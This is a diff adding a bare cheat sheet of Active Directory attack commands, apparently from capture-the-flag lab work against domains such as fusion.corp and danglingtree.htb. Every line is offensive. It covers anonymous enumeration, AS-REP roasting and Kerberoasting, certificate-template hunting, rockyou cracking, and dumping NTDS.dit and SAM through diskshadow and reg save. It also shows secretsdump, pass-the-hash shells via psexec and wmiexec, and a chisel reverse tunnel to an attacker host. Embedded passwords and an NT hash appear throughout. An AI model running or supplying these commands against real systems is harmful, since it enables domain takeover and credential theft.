@@ -1,0 +1,54 @@
+Initial Recon: 
+nmap -p- -Pn -T5 10.49.180.124 -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.49.180.124 -sC -sV -v -oN nmap_sC_sV.txt && sleep 5 && nmap -T5 -Pn 10.49.180.124 -v --script vuln -oN nmap_vuln.txt
+
+netexec smb 10.49.167.7 -u '' -p ''
+
+netexec smb 10.49.167.7 -u '' -p '' --rid-brute
+
+netexec smb 10.49.167.7 -u '' -p '' --users
+
+netexec smb 10.49.167.7 -u 'Guest' -p '' --users
+
+netexec ldap 10.49.167.7 -u '' -p '' --users
+
+netexec smb 10.49.167.7 -u '' -p '' --shares
+
+netexec wmi 10.49.167.7 -u '' -p ''
+
+rpcclient -N 10.49.167.7
+
+rpcclient -U '' -N 10.49.167.7
+	enumdomusers
+	
+kerbrute userenum usernames.txt --dc 10.49.167.7 -d fusion.corp
+
+impacket-GetNPUsers fusion.corp/ -dc-ip 10.49.167.7 -usersfile usernames.txt -format john -outputfile hashes.txt
+
+impacket-GetUserSPNs -dc-ip 10.129.38.142 'danglingtree.htb/anderson.w:R3dT3am@Acc3ss#01' -request
+
+certipy-ad find -u anderson.w@danglingtree.htb -p 'R3dT3am@Acc3ss#01' -dc-ip 10.129.38.142 -vulnerable -stdout
+
+certipy-ad find -u anderson.w@danglingtree.htb -p 'R3dT3am@Acc3ss#01' -dc-ip 10.129.38.142 -text -output certs
+
+cat -n certs_Certipy.txt | grep -iC4 'enrollment_rights' | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\'
+
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+evil-winrm -u jmurphy -p 'u8WC3!kLsgw=#bRY' -i 10.49.179.38
+		whoami /all
+		diskshadow /s viper.dsh
+		robocopy /b x:\windows\ntds . ntds.dit
+		reg save hklm\system c:\windows\tasks\system
+		reg save hklm\sam c:\windows\tasks\sam
+		
+for shaing: impacket-smbserver share ./ -smb2support -user test -pass ''
+
+impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.49.134.110
+
+rlwrap impacket-psexec fusion.corp/Administrator@10.49.159.250 -hashes :9653b02d945329c7270525c4c2a69c67
+
+rlwrap impacket-wmiexec fusion.corp/Administrator@10.49.159.250 -hashes :9653b02d945329c7270525c4c2a69c67
+
+chisel server -p 9999 --reverse
+
+.\chisel.exe client 10.10.14.128:9999 R:25:127.0.0.1:25 R:53:127.0.0.1:53 R:110:127.0.0.1:110 R:143:127.0.0.1:143 R:587:127.0.0.1:587 R:5222:127.0.0.1:5222 R:17017:127.0.0.1:17017
